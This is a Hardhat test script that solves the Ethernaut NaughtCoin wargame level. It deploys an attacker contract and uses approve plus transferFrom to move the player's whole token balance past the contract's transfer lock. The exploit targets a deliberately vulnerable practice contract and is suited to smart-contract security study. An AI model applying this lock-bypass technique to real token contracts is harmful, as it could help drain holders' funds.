import { expect } from "chai";
import { ethers } from "hardhat";

describe("NaughtCoin", async function () {

  it("Should drain player's balance", async function () {
    //setup+
    const [deployer, player] = await ethers.getSigners()
    const NaughtCoin = await ethers.getContractFactory("NaughtCoin");
    const naughtCoin = await NaughtCoin.deploy(player.address);
    await naughtCoin.deployed();
    //setup-

    //1. Deploy attacker
    const NaughtCoinAttacker = await ethers.getContractFactory("NaughtCoinAttacker");
    const naughtCoinAttacker = await NaughtCoinAttacker.connect(player).deploy(naughtCoin.address);
    await naughtCoinAttacker.deployed();

    expect(await naughtCoin.balanceOf(player.address)).to.gt(0)
    //2. Approve balance
    await naughtCoin.connect(player).approve(naughtCoinAttacker.address, await naughtCoin.balanceOf(player.address))
    //3. Transfer using transferFrom balance
    await naughtCoinAttacker.callTransferFrom()

    expect(await naughtCoin.balanceOf(player.address)).to.eq(0)
  });

});
